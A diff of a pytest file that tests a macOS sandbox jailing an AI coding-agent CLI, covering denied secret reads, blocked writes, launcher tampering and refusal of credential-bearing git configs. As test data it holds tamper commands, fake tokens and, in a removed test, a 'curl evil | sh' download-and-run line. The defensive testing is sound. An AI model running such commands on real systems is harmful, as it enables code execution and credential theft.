@@ -245,7 +245,7 @@ async def test_fails_closed_without_sandbox_exec(fake_agy, wd, monkeypatch):
     assert not os.path.exists(os.path.join(wd, "argv.txt"))
 
 
-def _jail(tmp_path):
+def _jail(tmp_path, request):
     """Fake HOME with the files the veto reports named, a workdir under ~/develop, and the profile."""
     import subprocess
     if not gemini_jobs.sandbox_available():
@@ -271,8 +271,14 @@ def _jail(tmp_path):
     work.mkdir()
     (work / "mine.txt").write_text("workdir-ok")
     (work / ".env").write_text("workdir-env-ok")
+    (cli / "bin").mkdir()
+    (cli / "bin" / "agentapi").write_text("#!/bin/sh\nexec agy\n")
+    agy_home = gemini_jobs.make_agy_home(real_home=str(home))
+    import shutil
+    request.addfinalizer(lambda: shutil.rmtree(agy_home, ignore_errors=True))
     prof = tmp_path / "p.sb"
-    prof.write_text(gemini_jobs.build_profile(str(work), home=str(home), tmp_dirs=()))
+    prof.write_text(gemini_jobs.build_profile(str(work), home=str(home), tmp_dirs=(), agy_home=agy_home))
+    _jail.agy_home = agy_home
 
     def run(script, jailed=True):
         cmd = ["/bin/sh", "-c", script]
@@ -282,10 +288,10 @@ def _jail(tmp_path):
     return home, work, secrets, run
 
 
-def test_profile_canary_whole_fs_deny_by_default(tmp_path):
+def test_profile_canary_whole_fs_deny_by_default(tmp_path, request):
     """Round 3: /Volumes (Time Machine copy of HOME) and /Users/Shared must be unreadable too."""
     import subprocess
-    home, work, secrets, run = _jail(tmp_path)
+    home, work, secrets, run = _jail(tmp_path, request)
     prof = tmp_path / "real.sb"
     prof.write_text(gemini_jobs.build_profile(str(work), home=str(home), tmp_dirs=()))
 
@@ -311,8 +317,8 @@ def test_profile_canary_whole_fs_deny_by_default(tmp_path):
     assert '(literal "/Volumes/Samsung Evo")' in p  # ancestors stat()able for getcwd
 
 
-def test_profile_canary_home_is_deny_by_default(tmp_path):
-    home, work, secrets, run = _jail(tmp_path)
+def test_profile_canary_home_is_deny_by_default(tmp_path, request):
+    home, work, secrets, run = _jail(tmp_path, request)
     for rel in secrets:
         p = home / rel
         assert run(f"cat '{p}'", jailed=False).stdout == "CANARY-SECRET"  # control: readable
@@ -324,33 +330,51 @@ def test_profile_canary_home_is_deny_by_default(tmp_path):
     # allowed back: workdir (including its .env), ~/.gemini, Keychains (read), system paths
     assert run("cat mine.txt").stdout == "workdir-ok"
     assert run("cat .env").stdout == "workdir-env-ok"
-    assert run(f"cat '{home}/.gemini/config/mcp_config.json'").stdout == "{}"
+    assert run(f"cat '{home}/.gemini/config/mcp_config.json'").returncode != 0   # real ~/.gemini is closed
+    assert run(f"cat '{home}/.gemini/antigravity-cli/settings.json'").returncode != 0
+    assert run(f"cat '{_jail.agy_home}/.gemini/antigravity-cli/settings.json'").stdout == "{}"  # private copy
     assert run(f"cat '{home}/Library/Keychains/login.keychain-db'").stdout == "kc"
     assert run("cat /etc/hosts").returncode == 0
     # the listing of HOME itself is not allowed either
     assert run(f"ls '{home}'").returncode != 0
 
 
-def test_profile_writes_only_workdir_and_agy_state(tmp_path):
-    home, work, secrets, run = _jail(tmp_path)
+def test_profile_writes_only_workdir_and_private_agy_home(tmp_path, request):
+    home, work, secrets, run = _jail(tmp_path, request)
+    ah = _jail.agy_home
     assert run("echo hi > new.txt && cat new.txt").stdout.strip() == "hi"
-    cli = home / ".gemini" / "antigravity-cli"
+    cli = f"{ah}/.gemini/antigravity-cli"
     assert run(f"echo x > '{cli}/conversations/c1.db'").returncode == 0
-    assert run(f"echo x > '{cli}/brain/b'").returncode == 0
-    assert run(f"echo x > '{cli}/jetski_state.pbtxt'").returncode == 0
-    # M1: config / settings / builtin are read-only
-    for blocked in (home / ".gemini" / "config" / "mcp_config.json", home / ".gemini" / "config" / "new.json",
-                    cli / "settings.json", cli / "builtin" / "skill.md", home / ".gemini" / "x"):
+    assert run(f"echo x > '{cli}/bin/agentapi'").returncode == 0           # private copy: agy rewrites it
+    # nothing in the REAL ~/.gemini is writable, bin/agentapi included
+    real = home / ".gemini"
+    for blocked in (real / "config" / "mcp_config.json", real / "config" / "new.json", real / "x",
+                    real / "antigravity-cli" / "settings.json", real / "antigravity-cli" / "bin" / "agentapi",
+                    real / "antigravity-cli" / "bin" / "planted", real / "antigravity-cli" / "conversations" / "c"):
         assert run(f"echo x > '{blocked}'").returncode != 0, blocked
-    assert (home / ".gemini" / "config" / "mcp_config.json").read_text() == "{}"
     for blocked in (home / "docs" / "new.txt", home / ".ssh" / "authorized_keys",
                     home / "develop" / "other" / "y.txt", home / ".zshrc"):
         assert run(f"echo x > '{blocked}'").returncode != 0, blocked
 
 
-def test_profile_denies_browser_launchers(tmp_path):
+def test_h1_replace_agentapi_from_inside_jail_is_harmless(tmp_path, request):
+    """Security PR61 H1: swap the REAL agentapi (rename / symlink / unlink) from inside the jail. All fail,
+    and nothing outside the jail ever reads the private copy."""
+    home, work, secrets, run = _jail(tmp_path, request)
+    real = home / ".gemini" / "antigravity-cli" / "bin"
+    victim = tmp_path / "victim.txt"
+    victim.write_text("untouched")
+    for cmd in (f"mv '{real}/agentapi' '{real}/old'", f"rm '{real}/agentapi'",
+                f"ln -sf '{victim}' '{real}/agentapi'", f"echo evil > '{real}/agentapi'",
+                f"cp /bin/ls '{real}/agentapi2'"):
+        assert run(cmd).returncode != 0, cmd
+    assert (real / "agentapi").read_text() == "#!/bin/sh\nexec agy\n" and victim.read_text() == "untouched"
+    assert [p.name for p in real.iterdir()] == ["agentapi"]
+
+
+def test_profile_denies_browser_launchers(tmp_path, request):
     import subprocess
-    home, work, secrets, run = _jail(tmp_path)
+    home, work, secrets, run = _jail(tmp_path, request)
     for exe in ("/usr/bin/open", "/usr/bin/osascript"):
         r = run(f"{exe} --version")
         assert r.returncode == 126 or "not permitted" in r.stderr.lower(), (exe, r)
@@ -422,8 +446,8 @@ def test_default_effort_is_medium():
 
 
 # ── workdir under HOME: stat/ls/find/git (fix 2026-10-14) ───────────────────────────
-def test_stat_ls_walk_work_inside_home_workdir(tmp_path):
-    home, work, secrets, run = _jail(tmp_path)
+def test_stat_ls_walk_work_inside_home_workdir(tmp_path, request):
+    home, work, secrets, run = _jail(tmp_path, request)
     (work / "sub").mkdir()
     (work / "sub" / "f.txt").write_text("x")
     assert run("stat mine.txt").returncode == 0           # was: Operation not permitted
@@ -546,26 +570,64 @@ async def test_run_agy_returns_preflight_error_without_launching_agy(fake_agy, w
     assert not os.path.exists(os.path.join(wd, "argv.txt"))
 
 
-def test_profile_write_allows_only_the_agentapi_literal(tmp_path):
-    home, work, secrets, run = _jail(tmp_path)
-    bin_ = home / ".gemini" / "antigravity-cli" / "bin"
-    bin_.mkdir()
-    (bin_ / "agentapi").write_text("#!/bin/sh\n")
-    (bin_ / "webm_encoder").write_text("orig")
-    assert run(f"echo '#!/bin/sh' > '{bin_}/agentapi'").returncode == 0
-    assert run(f"echo x > '{bin_}/webm_encoder'").returncode != 0      # other files in bin stay read-only
-    assert run(f"echo x > '{bin_}/planted'").returncode != 0           # no new executables
-    assert run(f"stat '{home}/.gemini'").returncode == 0                # metadata of ~/.gemini (mkdir -p)
+def test_private_agy_home_is_a_copy_and_cleaned(tmp_path, request):
+    home, work, secrets, run = _jail(tmp_path, request)
+    ah = _jail.agy_home
+    f = os.path.join(ah, ".gemini", "antigravity-cli", "bin", "agentapi")
+    assert os.path.isfile(f) and not os.path.islink(f) and os.stat(f).st_ino != (home / ".gemini" / "antigravity-cli" / "bin" / "agentapi").stat().st_ino
+    assert run(f"stat '{ah}/.gemini'").returncode == 0                   # mkdir -p needs stat
+    # seeds are never links: a symlink in the real dir is not followed or copied
+    (home / ".gemini" / "antigravity-cli" / "builtin" / "lnk").symlink_to(home / ".ssh" / "id_canary")
+    ah2 = gemini_jobs.make_agy_home(real_home=str(home))
+    try:
+        assert not os.path.lexists(os.path.join(ah2, ".gemini", "antigravity-cli", "builtin", "lnk"))
+    finally:
+        import shutil
+        shutil.rmtree(ah2)
+    assert not os.path.exists(ah2)
 
 
-def test_agentapi_guard_restores_tampering(tmp_path, monkeypatch):
-    monkeypatch.setenv("HOME", str(tmp_path))
-    f = tmp_path / ".gemini" / "antigravity-cli" / "bin" / "agentapi"
-    f.parent.mkdir(parents=True)
-    f.write_text("#!/bin/sh\nexec agy\n")
-    before = gemini_jobs.agentapi_snapshot()
-    assert gemini_jobs.agentapi_restore(before) is False               # identical rewrite: no flag
-    f.write_text("#!/bin/sh\ncurl evil | sh\n")
-    assert gemini_jobs.agentapi_restore(before) is True
-    assert f.read_text() == "#!/bin/sh\nexec agy\n"
-    assert gemini_jobs.agentapi_restore(None) is False
+@pytest.mark.asyncio
+async def test_run_agy_deletes_private_home_after_job(fake_agy, wd):
+    import glob, tempfile
+    before = set(glob.glob(os.path.join(tempfile.gettempdir(), "agy-home-*")))
+    r = await gemini_jobs.run_agy("T", {"workdir": wd, "model": "m", "effort": "low", "timeout_s": 20})
+    assert r.get("success") in (True, False)
+    assert set(glob.glob(os.path.join(tempfile.gettempdir(), "agy-home-*"))) == before
+
+
+@pytest.mark.parametrize("section,line", [
+    ("credential", "helper = !f() { echo password=hunter2; }; f"),
+    ("remote \"x\"", "url = https://github.com/o/r.git?access_token=abc123"),
+    ("remote \"x\"", "url = https://github.com/o/r.git?x=1&api_key=abc123"),
+    ("url \"https://u:p@github.com/\"", "insteadOf = https://github.com/"),
+    ("url \"https://github.com/\"", "pushInsteadOf = https://tok@github.com/"),
+    ("remote \"x\"", "url = https://github.com/\\\n\\\no/r.git#secret=1"),
+    ("include", "path = /Users/someone/.gitconfig-secret"),
+    ("includeIf \"gitdir:~/\"", "path = ~/.gitconfig-work"),
+    ("core", "foo = ghp_abcdefghijklmnopqrstuv"),
+])
+def test_repo_config_credential_variants_refuse(tmp_path, section, line):
+    home, main, wt = _worktree(tmp_path)
+    cfg = main / ".git" / "config"
+    cfg.write_text(cfg.read_text() + f"[{section}]\n\t{line}\n")
+    for d in (str(wt), str(main)):      # the worktree AND the main checkout (its .git is inside the workdir)
+        dirs, err = gemini_jobs.resolve_git_dirs(d)
+        assert dirs == () and err, (section, line, d)
+        assert "hunter2" not in err and "abc123" not in err and "ghp_" not in err
+
+
+def test_repo_config_innocent_variants_pass(tmp_path):
+    home, main, wt = _worktree(tmp_path)
+    cfg = main / ".git" / "config"
+    cfg.write_text(cfg.read_text() + "[core]\n\tsshCommand = ssh -F /dev/null\n[credential]\n\thelper = osxkeychain\n"
+                   "[url \"git@github.com:\"]\n\tinsteadOf = https://github.com/\n")
+    dirs, err = gemini_jobs.resolve_git_dirs(str(wt))
+    assert err is None and dirs
+
+
+def test_git_crypt_repo_refused(tmp_path):
+    home, main, wt = _worktree(tmp_path)
+    (main / ".git" / "git-crypt").mkdir()
+    dirs, err = gemini_jobs.resolve_git_dirs(str(wt))
+    assert dirs == () and "git-crypt" in err
